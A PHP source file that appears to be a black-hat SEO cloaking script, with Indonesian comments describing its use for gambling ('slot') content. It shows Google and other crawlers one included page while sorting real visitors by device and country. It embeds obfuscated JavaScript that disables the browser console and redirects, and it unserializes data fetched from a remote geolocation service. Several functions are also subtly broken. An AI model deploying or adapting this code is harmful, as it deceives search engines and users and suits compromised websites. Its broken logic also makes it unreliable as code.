<?php

// CONTRIBUTE BY IT TEAMS & 🕊️ [ j0x73 ] 🕊️

class Kosongx73
{
    // INPUT DAN ISI NILAI REDIRECT_URL DENGAN DOMAIN YANG SEDANG DIGUNAKAN UNTUK CLOAKING
    // https://marvelaquarium.com/

    protected $REDIRECT_URL = "";

    /**
     * @var bool
     */

    protected $BYPASS_CLIENT_SIDE_CHECKS = false;

    /**
     * @var string
     */

    // THIRD PARTY API BIARKAN KOSONG
    protected $IP_STACK_TOKEN = "";

    /**
     * @var array
     */

    protected $BLOCKED_COUNTRY_CODES = ["KH"];

    /**
     * @var array
     */

    protected $BLOCKED_CITY_NAMES = ["Phnom Penh"];

    /**
     * @var array
     */

    protected $BLOCKED_IP_RANGES = [
        "185.45.4.0/23",
        "185.45.4.0/24",
        "192.133.78.0/23",
        "8.25.194.0/23",
        "8.25.195.0/24",
        "8.25.196.0/23",
        "8.25.196.0/24",
    ];

    /**
     *
     * @var array
     */

    protected $BLOCKED_USER_AGENTS = [
        "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/W.X.Y.Z Safari/537.36",
    ];

    /**
     *
     * @var string
     */

    protected $OBSFUCATED_JAVASCRIPT = "";
    /**
     *
     *
     * @var bool
     */

    protected $blocked = false;

    /**
     *
     *
     * @var array
     */
    protected $errors = [];

    /**
     *
     *
     * @return bool
     */

    public function isBlocked()
    {
        return !!$this->blocked;
    }

    /**
     *
     *
     * @return bool
     */

    public function shouldBypassClientSideChecks()
    {
        return !!$this->BYPASS_CLIENT_SIDE_CHECKS;
    }

    /**
     *
     *
     * @return array
     */

    public function getErrors()
    {
        return $this->errors;
    }

    /**
     *
     *
     * @return string
     */

    public function getRedirectUrl()
    {
        return $this->REDIRECT_URL;
    }

    /**
     *
     *
     * @return string
     */

    public function getClientSideJavascript()
    {
        $javascript = !empty($this->OBSFUCATED_JAVASCRIPT)
            ? $this->OBSFUCATED_JAVASCRIPT
            : "var _0x5786=['{}.constructor(\x22return\x20this\x22)(\x20)','Edg','undefined','REDIRECT_URL','addons','toString','chrome','removeChild','[object\x20SafariRemoteNotification]','runtime','table','DOMContentLoaded','test','debug','safari','opera','location','style','StyleMedia','return\x20(function()\x20','CSS','apply','info','\x20OPR/','none','forEach','BLOCKED_USER_AGENTS','exception','error','replace','warn','userAgent','HTMLElement','parentNode','addEventListener','overlay','log','console','documentMode','trace','indexOf','getElementById','webstore'];(function(_0x5cbf48,_0x5786d5){var _0x133a51=function(_0x32abcc){while(--_0x32abcc){_0x5cbf48['push'](_0x5cbf48['shift']());}};_0x133a51(++_0x5786d5);}(_0x5786,0x1e9));var _0x133a=function(_0x5cbf48,_0x5786d5){_0x5cbf48=_0x5cbf48-0x0;var _0x133a51=_0x5786[_0x5cbf48];return _0x133a51;};var _0x5a591d=_0x133a('0x1e');var _0x4520af=_0x133a('0xa');function _0x489b2e(){var _0x90f982=new RegExp(_0x4520af,'i');var _0x4bcf61=navigator[_0x133a('0xf')];return!_0x90f982[_0x133a('0x27')](_0x4bcf61);}function _0x47d5c5(){var _0x1650e7=function(){var _0x1f34fb=!![];return function(_0x200b3b,_0x160f73){var _0x4c57ca=_0x1f34fb?function(){if(_0x160f73){var _0x29fd8a=_0x160f73[_0x133a('0x5')](_0x200b3b,arguments);_0x160f73=null;return _0x29fd8a;}}:function(){};_0x1f34fb=![];return _0x4c57ca;};}();var _0x57cdfc=!!window['opr']&&!!opr[_0x133a('0x1f')]||!!window[_0x133a('0x2a')]||navigator[_0x133a('0xf')][_0x133a('0x18')](_0x133a('0x7'))>=0x0;var _0x1d22de=typeof InstallTrigger!==_0x133a('0x1d');var _0x8e0980=/constructor/i[_0x133a('0x27')](window[_0x133a('0x10')])||function(_0x2f5b18){var _0x2ec891=_0x1650e7(this,function(){var _0x1d695e=function(){};var _0x499453=function(){var _0x23a2a4;try{_0x23a2a4=Function(_0x133a('0x3')+_0x133a('0x1b')+');')();}catch(_0x57655c){_0x23a2a4=window;}return _0x23a2a4;};var _0x500b0f=_0x499453();if(!_0x500b0f[_0x133a('0x15')]){_0x500b0f['console']=function(_0x443ef5){var _0x4532db={};_0x4532db[_0x133a('0x14')]=_0x443ef5;_0x4532db[_0x133a('0xe')]=_0x443ef5;_0x4532db[_0x133a('0x28')]=_0x443ef5;_0x4532db[_0x133a('0x6')]=_0x443ef5;_0x4532db[_0x133a('0xc')]=_0x443ef5;_0x4532db['exception']=_0x443ef5;_0x4532db[_0x133a('0x25')]=_0x443ef5;_0x4532db[_0x133a('0x17')]=_0x443ef5;return _0x4532db;}(_0x1d695e);}else{_0x500b0f[_0x133a('0x15')]['log']=_0x1d695e;_0x500b0f[_0x133a('0x15')][_0x133a('0xe')]=_0x1d695e;_0x500b0f[_0x133a('0x15')][_0x133a('0x28')]=_0x1d695e;_0x500b0f[_0x133a('0x15')][_0x133a('0x6')]=_0x1d695e;_0x500b0f[_0x133a('0x15')][_0x133a('0xc')]=_0x1d695e;_0x500b0f['console'][_0x133a('0xb')]=_0x1d695e;_0x500b0f[_0x133a('0x15')][_0x133a('0x25')]=_0x1d695e;_0x500b0f[_0x133a('0x15')][_0x133a('0x17')]=_0x1d695e;}});_0x2ec891();return _0x2f5b18[_0x133a('0x20')]()===_0x133a('0x23');}(!window[_0x133a('0x29')]||typeof safari!==_0x133a('0x1d')&&safari['pushNotification']);var _0x295dbe=![]||!!document[_0x133a('0x16')];var _0x27ad47=!_0x295dbe&&!!window[_0x133a('0x2')];var _0x129c73=!!window[_0x133a('0x21')]&&(!!window[_0x133a('0x21')][_0x133a('0x1a')]||!!window[_0x133a('0x21')][_0x133a('0x24')]);var _0x2878e2=_0x129c73&&navigator[_0x133a('0xf')]['indexOf'](_0x133a('0x1c'))!=-0x1;var _0x36890e=(_0x129c73||_0x57cdfc)&&!!window[_0x133a('0x4')];var _0x3e6d53=[_0x57cdfc,_0x1d22de,_0x8e0980,_0x295dbe,_0x27ad47,_0x129c73,_0x2878e2,_0x36890e];var _0x346ca1=![];_0x3e6d53[_0x133a('0x9')](function(_0xd5b2fe){if(_0xd5b2fe){_0x346ca1=!![];}});return _0x346ca1;}if(_0x489b2e()&&_0x47d5c5()){window[_0x133a('0x0')][_0x133a('0xd')](_0x5a591d);}else{document[_0x133a('0x12')](_0x133a('0x26'),function(){var _0x1713f5=document[_0x133a('0x19')](_0x133a('0x13'));_0x1713f5[_0x133a('0x1')]['display']=_0x133a('0x8');_0x1713f5[_0x133a('0x11')][_0x133a('0x22')](_0x1713f5);});}";

        $javascript = str_replace(
            "REDIRECT_URL",
            $this->getRedirectUrl(),
            $javascript,
        );
        $javascript = str_replace(
            "BLOCKED_USER_AGENTS",
            $this->getBlockedUserAgents(),
            $javascript,
        );

        return $javascript;
    }

    /**
     *
     *
     * @return bool
     */
    public function check()
    {
        if (!$this->blocked && $this->checkUserAgent()) {
            $this->blocked = true;
        }

        if (!$this->blocked && $this->checkIpAddress()) {
            $this->blocked = true;
        }

        return $this->blocked;
    }

    /**
     *
     *
     * @return bool
     */
    public function checkUserAgent()
    {
        $search = $this->getBlockedUserAgents();

        return !!(
            isset($_SERVER["HTTP_USER_AGENT"]) &&
            preg_match($search, $_SERVER["HTTP_USER_AGENT"])
        );
    }

    /**
     *
     *
     *
     *
     * @return bool
     */
    public function checkIpAddress()
    {
        $ip = $this->getIpAddress();
        $ipstack = $this->getIpStack($ip);

        if (
            $ipstack &&
            !(isset($ipstack->success) && $ipstack->success === false)
        ) {
            if (
                $ipstack->security->is_crawler ||
                in_array(
                    $ipstack->country_code,
                    $this->BLOCKED_COUNTRY_CODES,
                ) ||
                in_array($ipstack->country_code, $this->BLOCKED_CITY_NAMES) ||
                $this->ipInRange($ip, $this->BLOCKED_IP_RANGES)
            ) {
                return true;
            }
        }

        return false;
    }

    /**
     *
     *
     * @return string
     */
    public function getBlockedUserAgents()
    {
        $search = "";
        if (count($this->BLOCKED_USER_AGENTS)) {
            $search = implode("|", $this->BLOCKED_USER_AGENTS);
            $search = preg_quote($search) . "|";
        }
        $search =
            $search .
            "Googlebot|googlebot|bot|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis";
        $search = "(" . $search . ")";

        return $search;
    }

    /**
     *
     *
     * @return string
     */
    protected function getIpAddress()
    {
        if (!empty($_SERVER["HTTP_CLIENT_IP"])) {
            $ip = $_SERVER["HTTP_CLIENT_IP"];
        } elseif (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])) {
            $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
        } else {
            $ip = $_SERVER["REMOTE_ADDR"];
        }

        return $ip;
    }

    /**
     *
     *
     *
     * @param $ip
     *
     * @return mixed|null
     */
    protected function getIpStack($ip)
    {
        try {
            $response = json_decode(
                file_get_contents(
                    sprintf("http://www.geoplugin.net/php.gp?ip=", $ip),
                ),
            );

            if (
                $response &&
                !(isset($response->success) && $response->success === false)
            ) {
                $ipstack = $response;
            }
        } catch (Exception $e) {
            $this->errors[] = $e->getMessage();
        }
    }

    /**
     *
     *
     * @param $ip
     * @param $range
     *
     * @return bool
     */
    protected function ipInRange($ip, $range)
    {
        if (strpos($range, "/") == false) {
            $range .= "/32";
        }

        [$range, $netmask] = explode("/", $range, 2);

        $ip_decimal = ip2long($ip);
        $range_decimal = ip2long($range);
        $wildcard_decimal = pow(2, 32 - $netmask) - 1;
        $netmask_decimal = ~$wildcard_decimal;

        return ($ip_decimal & $netmask_decimal) ==
            ($range_decimal & $netmask_decimal);
    }
}

function getjxjVIP()
{
    if (!empty($_SERVER["HTTP_CLIENT_IP"])) {
        // Check if IP is from shared internet
        $ip = $_SERVER["HTTP_CLIENT_IP"];
    } elseif (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])) {
        // Check if IP is passed from proxy
        $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
    } else {
        // Default to REMOTE_ADDR if no proxy is used
        $ip = $_SERVER["REMOTE_ADDR"];
    }
    return $ip;
}

$j0x73 = new Kosongx73();
$blocked = $j0x73->check();

if ($j0x73->shouldBypassClientSideChecks()) {
    header(sprintf("Location: %s", $j0x73->getRedirectUrl()));
    exit();
}

$useragent = $_SERVER["HTTP_USER_AGENT"];

/** SCRIPT CLOAKING BERJALAN DIMULAI DARI KODE DIBAWAH INI
 * NOTE* PENTING
 * SCRIPT CLOAKING BERJALAN DAN BERLAKU UNTUK NEGARA INDONESIA SAJA
 * NAMUN TETAP TIDAK MENGHALANGI GOOGLE CRAWL.
 * SCRIPT CLOAKING INI JUGA DI SERTAI UNTUK KONTEN HITAM KALIAN YANG AKAN DI CRAWL NANTINYA
 * OLEH GOOGLE CRAWL / GOOGLE BOT
 **/

// SCRIPT CLOAKING BERJALAN DIMULAI DARI KODE DIBAWAH INI
// PERHATIKAN DAN BACA DENGAN BAIK SETIAP KOMENTAR INSTRUKSI DIBAWAH INI.

// MENAMPILKAN KONTEN SLOT ATAU KONTEN HITAM HANYA PADA MOBILE DEVICES / SCREEN.
if (
    preg_match(
        "/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i",
        $useragent,
    ) ||
    preg_match(
        "/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i",
        substr($useragent, 0, 4),
    )
) {
    if (!$blocked) {
        // PANGGIL KONTEN SLOT KALIAN UNTUK MOBILE

        $getIP = getjxjVIP();
        $geoplugin = unserialize(
            file_get_contents("http://www.geoplugin.net/php.gp?ip=" . $getIP),
        );

        switch ($geoplugin["hoskes_locplugin_countryCode"]) {
            case "ID":
                include "h.php";
                break;
            default:
                include "p.php";
                break;
        }
    } elseif ($blocked) {
        // PANGGIL KONTEN SLOT KALIAN UNTUK DI CRAWL PADA MOBILE
        include "h.php";
    }
} else {
    if ($blocked) {
        // PANGGIL KONTEN SLOT KALIAN UNTUK DI CRAWL PADA DESKTOP
        include "h.php";
    } else {
        include "p.php";
    }
}

?>